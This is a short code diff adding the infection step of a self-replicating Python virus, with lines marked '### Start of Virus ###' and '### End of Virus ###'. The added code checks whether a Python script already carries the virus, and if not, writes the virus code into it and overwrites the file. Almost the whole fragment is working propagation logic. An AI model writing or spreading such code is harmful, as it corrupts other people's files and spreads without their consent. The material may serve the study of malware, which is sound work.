@@ -31,5 +31,13 @@ for script in python_scripts:
         if line == '### Start of Virus ###\n':
             infected = True
             break
-
+    # If not infected then  add the virus code into final_code into the file.
+    if not infected:
+        final_code = []
+        final_code.extend(code)
+        final_code.extend('\n')
+        final_code.extend(script_code)
+        # Override everything  with the final_code
+        with open(script, 'w') as f:
+            f.writelines(final_code)
 ### End of Virus ###
